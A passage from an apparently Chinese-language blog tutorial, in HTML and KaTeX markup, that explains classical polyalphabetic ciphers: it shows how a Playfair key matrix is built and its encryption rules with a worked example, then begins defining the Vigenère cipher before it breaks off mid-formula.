class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span></span></span></span></p><h2 id="多表代替密码"><a class="markdownIt-Anchor" href="#多表代替密码"></a> 多表代替密码</h2><p>多表代替密码使用从明文字母到密文字母的<strong>多个映射</strong>来隐藏单字母出现的频率的分布，其中每个映射都是单表代替密码中的一对一映射。一般来说，我们的做法都是将明文字母划分为长度相同的消息单元，称为明文分组，对明文字母成组地进行代替。</p><p>多表代替密码的特点是使用两个或者两个以上的表。</p><p>我们主要介绍以下三个多表代替密码：</p><ul><li>普莱菲尔密码（Playfair Cipher）</li><li>维吉尼亚密码（Vigenere Cipher）</li><li>希尔密码（Hill Cipher）</li></ul><h3 id="playfair密码"><a class="markdownIt-Anchor" href="#playfair密码"></a> Playfair密码</h3><p>Playfair密码加密流程如下：</p><ol><li><p>将明文中的双字母作为一个单元对待，并将这些单元转换为密文字母组合</p></li><li><p>基于一个5×5字母矩阵，使用一个关键词（密钥）来构造</p></li><li><p>构造方法：从左至右，从上至下依次填入关键词的字母（去除重复的字母），然后再以字母表顺序依次填入其他的字母。加密时字母I和J被算作一个字母</p><p>例如，密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>y</mi><mi>f</mi><mi>a</mi><mi>i</mi><mi>r</mi><mtext> </mtext><mi>i</mi><mi>s</mi><mtext> </mtext><mi>a</mi><mtext> </mtext><mi>d</mi><mi>i</mi><mi>g</mi><mi>r</mi><mi>a</mi><mi>m</mi><mtext> </mtext><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">k= playfair\ is\ a\ digram\ cipher</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace"> </span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mspace"> </span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mspace"> </span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>，去除重复字母后，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>y</mi><mi>f</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>d</mi><mi>g</mi><mi>m</mi><mi>c</mi><mi>h</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">k= playfirsdgmche</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">s</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">m</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span></span></span></span>，可得字母矩阵如下</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240623140740165.png" alt="" /></p></li><li><p>对每一对明文字母P1, P2的加密方法如下：</p><ul><li>若P1、P2在同一行，密文C1、C2分别是紧靠P1、P2右端的字母。其中第一列被看作是最后一列的右方；（解密时反向）</li><li>若P1、P2在同一列，密文C1、C2分别是紧靠P1、P2下方的字母。其中第一行看作是最后一行的下方；（解密时反向）</li><li>若P1、P2不在同一行，也不在同一列，则C1、C2是由P1、P2确定的矩形其它两角的字母，且C1和P1在同一行，C2和P2在同一行；（解密时处理方法相同）</li><li>若P1＝P2，则两个字母间插入一个预先约定的字母，如q，并用前述方法处理；如balloon，则以ba lq lo on 来加密。</li><li>若明文字母数为奇数，则在明文尾填充约定字母。</li></ul></li></ol><h4 id="例题-3"><a class="markdownIt-Anchor" href="#例题-3"></a> 例题</h4><p>密钥不变，延续上文的字母矩阵。明文为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>y</mi><mi>f</mi><mi>a</mi><mi>i</mi><mi>r</mi><mtext> </mtext><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">p = playfair\ cipher</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace"> </span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>，用playfair密码进行加密。</p><p>明文分组：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>l</mi><mtext> </mtext><mi>a</mi><mi>y</mi><mtext> </mtext><mi>f</mi><mi>a</mi><mtext> </mtext><mi>i</mi><mi>r</mi><mtext> </mtext><mi>c</mi><mi>i</mi><mtext> </mtext><mi>p</mi><mi>h</mi><mtext> </mtext><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">pl\ ay\ fa\ ir\ ci\ ph\ er</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mspace"> </span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace"> </span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mspace"> </span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></p><p>密文分组：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>A</mi><mtext> </mtext><mi>Y</mi><mi>F</mi><mtext> </mtext><mi>P</mi><mi>Y</mi><mtext> </mtext><mi>R</mi><mi>S</mi><mtext> </mtext><mi>M</mi><mi>R</mi><mtext> </mtext><mi>A</mi><mi>M</mi><mtext> </mtext><mi>C</mi><mi>D</mi></mrow><annotation encoding="application/x-tex">LA\ YF\ PY\ RS\ MR\ AM\ CD</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal">A</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace"> </span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240623140740165.png" alt="" /></p><h4 id="特点"><a class="markdownIt-Anchor" href="#特点"></a> 特点</h4><ul><li>虽然仅有26个字母，但有26×26＝676种双字母组合．因此识别各种双字母组合要困难得多</li><li>各个字母组的频率要比单字母呈现出大得多的范围，使得频率分析困难得多</li><li>仍然使许多明文语言的结构保存完好，使得密码分析者能够利用</li></ul><h3 id="vigenere密码"><a class="markdownIt-Anchor" href="#vigenere密码"></a> Vigenere密码</h3><p>Vigenere密码是最著名的多表代替密码的例子，它使用一个词组作为密钥，密钥中每一个字母用来确定一个代替表，每一个密钥字母用来加密一个明文字母，等所有密钥字母使用完后，密钥又再循环使用</p><p>设密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>𝑘</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>𝑘</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>𝑘</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mo separator="true">,</mo><msub><mi>𝑘</mi><mi>𝑑</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">𝑘 = (𝑘_1, 𝑘_2, ⋯ , 𝑘_𝑑)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，明文：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>𝑝</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>𝑝</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>𝑝</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mo separator="true">,</mo><msub><mi>𝑝</mi><mi>𝑛</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">𝑝 = (𝑝_1, 𝑝_2, ⋯ , 𝑝_𝑛)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，密文：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>𝑐</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>𝑐</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>𝑐</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mo separator="true">,</mo><msub><mi>𝑐</mi><mi>𝑛</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">𝑐 = (𝑐_1, 𝑐_2, ⋯ , 𝑐_𝑛)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p><p>加密变换：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝐸</mi><mi>𝑘</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>𝑐</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>𝑐</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mo separator="true">,</mo><msub><mi>𝑐</mi><mi>𝑛</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">𝐸_𝑘(p)= (𝑐_1, 𝑐_2, ⋯ , 𝑐_𝑛)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝑐</mi><mi>𝑖</mi></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>𝑝</mi><mi>𝑖</mi></msub><mo>+</mo><msub><mi>𝑘</mi><mi>𝑖</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo><mtext>，</mtext><mi>i</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">𝑐_𝑖 = (𝑝_𝑖 + 𝑘_𝑖)(\bmod 26)，i =1, 2, …, n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>解密变换：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝐷</mi><mi>𝑘</mi></msub><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>𝑝</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>𝑝</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mo separator="true">,</mo><msub><mi>𝑝</mi><mi>𝑛</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">𝐷_𝑘(c)= (𝑝_1, 𝑝_2, ⋯ , 